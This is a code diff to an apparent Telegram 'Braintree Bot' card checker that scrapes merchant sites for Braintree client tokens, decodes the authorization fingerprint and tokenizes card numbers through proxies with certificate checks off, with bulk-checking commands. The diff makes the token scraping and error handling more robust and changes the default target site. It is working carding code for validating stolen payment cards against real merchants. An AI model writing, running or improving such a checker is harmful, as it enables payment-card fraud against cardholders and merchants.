@@ -250,70 +250,95 @@ class BraintreeChecker:
         site_url = get_braintree_site(self.chat_id)
         
         try:
-            # Step 1: Get checkout page to get Braintree config
+            # Step 1: First just try to get homepage with retries
             headers = {
                 'User-Agent': self.user_agent,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
             }
             
-            response = self.session.get(f'{site_url}/checkout/', headers=headers, proxies=get_proxies(), verify=False, timeout=30)
+            # Try homepage first
+            try:
+                response = self.session.get(site_url, headers=headers, proxies=get_proxies(), verify=False, timeout=20, allow_redirects=True)
+            except Exception as e:
+                return {'status': 'error', 'message': f'Connection failed: {str(e)[:50]}', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
             
-            if response.status_code != 200:
-                return {'status': 'error', 'message': 'Site unreachable', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
+            if response.status_code not in [200, 301, 302]:
+                return {'status': 'error', 'message': f'Site error: {response.status_code}', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
             
-            # Extract Braintree client token from page
+            # Step 2: Try to get Braintree token from different sources
             client_token = None
             
-            # Try to find client token in script
-            token_patterns = [
-                r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                r'client_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                r'"token"\s*:\s*"([^"]+)"',
-            ]
+            # Method 1: Try checkout page
+            try:
+                checkout_response = self.session.get(f'{site_url}/checkout/', headers=headers, cookies=self.session.cookies, proxies=get_proxies(), verify=False, timeout=20)
+                
+                if checkout_response.status_code == 200:
+                    # Search for token in page
+                    token_patterns = [
+                        r'clientToken["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{100,})["\']',
+                        r'client_token["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{100,})["\']',
+                        r'"token"\s*:\s*"([A-Za-z0-9+/=]{100,})"',
+                    ]
+                    
+                    for pattern in token_patterns:
+                        match = re.search(pattern, checkout_response.text)
+                        if match:
+                            client_token = match.group(1)
+                            break
+            except:
+                pass
             
-            for pattern in token_patterns:
-                match = re.search(pattern, response.text)
-                if match:
-                    client_token = match.group(1)
-                    break
-            
-            # If token not found in page, try API endpoint
+            # Method 2: Try API endpoints
             if not client_token:
                 headers_api = {
                     'User-Agent': self.user_agent,
-                    'Accept': 'application/json',
+                    'Accept': 'application/json, text/plain, */*',
                     'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest',
                 }
                 
-                # Try common Braintree token endpoints
                 token_endpoints = [
                     f'{site_url}/rest/default/V1/braintree/client_token',
                     f'{site_url}/braintree/client_token',
                     f'{site_url}/rest/sac/V1/braintree/client_token',
+                    f'{site_url}/api/braintree/token',
                 ]
                 
                 for endpoint in token_endpoints:
                     try:
                         token_response = self.session.get(endpoint, headers=headers_api, cookies=self.session.cookies, proxies=get_proxies(), verify=False, timeout=15)
+                        
                         if token_response.status_code == 200:
                             try:
                                 data = token_response.json()
-                                if isinstance(data, dict) and 'token' in data:
-                                    client_token = data['token']
-                                    break
-                                elif isinstance(data, str):
+                                if isinstance(data, dict):
+                                    if 'token' in data:
+                                        client_token = data['token']
+                                        break
+                                    elif 'clientToken' in data:
+                                        client_token = data['clientToken']
+                                        break
+                                elif isinstance(data, str) and len(data) > 100:
                                     client_token = data
                                     break
                             except:
-                                pass
+                                # Try as plain text
+                                text_data = token_response.text.strip().strip('"')
+                                if len(text_data) > 100:
+                                    client_token = text_data
+                                    break
                     except:
                         continue
             
+            # If still no token, return error
             if not client_token:
                 return {'status': 'error', 'message': 'No Braintree token found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
             
-            # Decode token to get authorization
+            # Step 3: Decode token to get authorization
             try:
                 dec_token = base64.b64decode(client_token).decode('utf-8')
                 auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', dec_token)
@@ -323,9 +348,9 @@ class BraintreeChecker:
                 
                 auth_token = auth_match.group(1)
             except Exception as e:
-                return {'status': 'error', 'message': f'Token decode failed: {str(e)}', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
+                return {'status': 'error', 'message': f'Token decode error', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
             
-            # Step 2: Tokenize card with Braintree
+            # Step 4: Tokenize card with Braintree
             headers_bt = {
                 'User-Agent': self.user_agent,
                 'Authorization': f'Bearer {auth_token}',
@@ -374,7 +399,7 @@ class BraintreeChecker:
             try:
                 bt_json = bt_response.json()
                 
-                # Check for errors in response
+                # Check for errors
                 if 'errors' in bt_json:
                     error_msg = bt_json['errors'][0].get('message', 'Card Declined')
                     
@@ -427,7 +452,7 @@ class BraintreeChecker:
             except Exception as e:
                 return {
                     'status': 'error',
-                    'message': f'Response parse error: {str(e)}',
+                    'message': 'Response parse error',
                     'icon': '❌',
                     'card_info': card_info,
                     'time': elapsed_time
@@ -441,11 +466,29 @@ class BraintreeChecker:
                 'time': elapsed_time
             }
             
+        except requests.exceptions.Timeout:
+            elapsed_time = round(time.time() - start_time, 2)
+            return {
+                'status': 'error',
+                'message': 'Connection timeout',
+                'icon': '❌',
+                'card_info': card_info,
+                'time': elapsed_time
+            }
+        except requests.exceptions.ConnectionError:
+            elapsed_time = round(time.time() - start_time, 2)
+            return {
+                'status': 'error',
+                'message': 'Site unreachable',
+                'icon': '❌',
+                'card_info': card_info,
+                'time': elapsed_time
+            }
         except Exception as e:
             elapsed_time = round(time.time() - start_time, 2)
             return {
                 'status': 'error',
-                'message': f'Error: {str(e)}',
+                'message': f'Error: {str(e)[:30]}',
                 'icon': '❌',
                 'card_info': card_info,
                 'time': elapsed_time
@@ -1527,6 +1570,6 @@ def send_help(message):
 
 if __name__ == '__main__':
     print("🚀 Braintree Bot started...")
-    print("✅ Using bandc.com as default site")
+    print("✅ Using porn.com as default site")
     print("💳 Commands: /bchk, /bmass, /bfile")
     bot.infinity_polling()
